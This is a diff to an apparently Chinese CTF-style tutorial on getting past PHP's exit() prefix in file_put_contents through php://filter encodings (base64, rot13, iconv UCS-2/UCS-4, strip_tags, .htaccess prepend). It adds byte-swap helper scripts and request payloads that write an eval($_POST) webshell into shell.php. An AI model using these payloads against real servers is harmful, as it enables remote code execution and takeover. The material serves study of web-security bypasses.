@@ -766,7 +766,7 @@ filename=php://filter/convert.base64-decode/resource=shell.php&content=aPD9waHAg
 
 
 
-二.rot13编码绕过
+#### 二.rot13编码绕过
 
 先解释一下什么是rot13吧
 
@@ -784,7 +784,87 @@ filename=php://filter/convert.string.rot13/resource=shell.php&content=<?cuc cucv
 
 
 
-三.过滤器嵌套
+#### 三.**convert.iconv.\*绕过**
+
+对于iconv字符编码转换进行绕过的手法，其实类似于上面所述的base64编码手段，都是先对原有字符串进行某种编码然后再解码，这个过程导致最初的限制exit去除，而我们的恶意代码正常解码存储。
+
+{% hint style="info" %}
+其实后面看到只要是编码方式就可以进行过滤，并且原理是一样的，我们只要变换协议和编码就行。这里展现了一些编码[https://www.php.net/manual/zh/mbstring.supported-encodings.php](https://www.php.net/manual/zh/mbstring.supported-encodings.php)
+{% endhint %}
+
+这里介绍几种。
+
+#### （1）ucs-2
+
+对目标字符串进行2位一反转，也就是说，字符串的数目得是偶数。不然就会被截断。可以去这个里面去看看工具，很多很偏门的工具，虽然我没找到在线的，但是我让chatgpt生成了一个脚本。
+
+[https://onlinetexttools.com/convert-unicode-to-ucs2](https://onlinetexttools.com/convert-unicode-to-ucs2)
+
+```python
+def swap_pairs(text):
+    # 对输入字符串中的每两个字符进行位置互换
+    swapped_text = ""
+    for i in range(0, len(text), 2):
+        # 逐对提取字符并交换位置
+        pair = text[i:i+2]
+        swapped_pair = pair[1] + pair[0]  # 交换位置
+        swapped_text += swapped_pair
+    return swapped_text
+
+def main():
+    text = input("Enter the text to encode using UCS-2: ")
+    if len(text) % 2 == 0:  # 检查字符串长度是否为偶数
+        swapped_text = swap_pairs(text)
+        print("UCS-2 encoded text:", swapped_text)
+    else:
+        print("Input string length must be even. Current character count:", len(text))
+
+if __name__ == "__main__":
+    main()
+
+```
+
+这个时候用到的过滤器是`convert.iconv.UCS-2LE.UCS-2BE` ,
+
+姿势：
+
+```url
+file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&content=?<hp pe@av(l_$OPTSx[)]?;;>
+```
+
+#### (2)ucs-4
+
+对目标字符串进行4位一反转，也就是说，字符串的数目得是4的倍数。不然就会被截断。脚本给上
+
+```php
+def swap_quads(text):
+    # 对输入字符串中的每四个字符进行位置翻转
+    swapped_text = ""
+    for i in range(0, len(text), 4):
+        # 逐四个提取字符并翻转位置
+        quad = text[i:i+4]
+        swapped_quad = quad[::-1]  # 翻转位置
+        swapped_text += swapped_quad
+    return swapped_text
+
+def main():
+    text = input("Enter the text to encode using UCS-4: ")
+    if len(text) % 4 == 0:  # 检查字符串长度是否为4的倍数
+        swapped_text = swap_quads(text)
+        print("UCS-4 encoded text:", swapped_text)
+    else:
+        print("Input string length must be a multiple of 4. Current character count:", len(text))
+
+if __name__ == "__main__":
+    main()
+
+```
+
+这个时候用到的过滤器是`convert.iconv.UCS-4LE.UCS-4BE` ,
+
+原理是一样的，就不细写了。
+
+#### 四.过滤器嵌套
 
 用了一个过滤器`string.strip_tags`
 
@@ -802,7 +882,7 @@ filename=php://filter/string.strip_tags|convert.base64-decode/resource=shell.php
 
 
 
-四. `.htaccess`的预包含利用
+#### 五. `.htaccess`的预包含利用
 
 这里先给大家看姿势再解释吧
 
@@ -815,7 +895,7 @@ content=?>php_value auto_prepend_file D:\\phpstudy_pro\\www\\flag.php
 
 
 
-<mark style="color:orange;">②</mark><mark style="color:orange;">`file_put_contents($content,"<?php exit();".$content);`</mark>
+#### <mark style="color:orange;">②</mark><mark style="color:orange;">`file_put_contents($content,"<?php exit();".$content);`</mark>
 
 这种情况下文件名和文件内容一致，但是我们需要前面的文件时php结尾，所以我们需要添加.php，并且需要利用filter这个还是一样的。所以我们写出来的姿势就变成了。
 
@@ -862,7 +942,13 @@ for ($ascii1 = 0; $ascii1 < 256; $ascii1++) {
 
 
 
+#### 三.convert.iconv.\*过滤
 
+直接写过滤姿势了，因为原理前面讲过了。这里写的ucs-2，其实4也可以。
+
+```url
+file=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?<hp pe@av(l_$OPTSx[)]?;;>/resource=shell.php
+```
 
 
 
@@ -873,12 +959,6 @@ for ($ascii1 = 0; $ascii1 < 256; $ascii1++) {
 ```url
 filename=shell.php&content=<?php phpinfo();?>
 ```
-
-
-
-
-
-
 
 
 
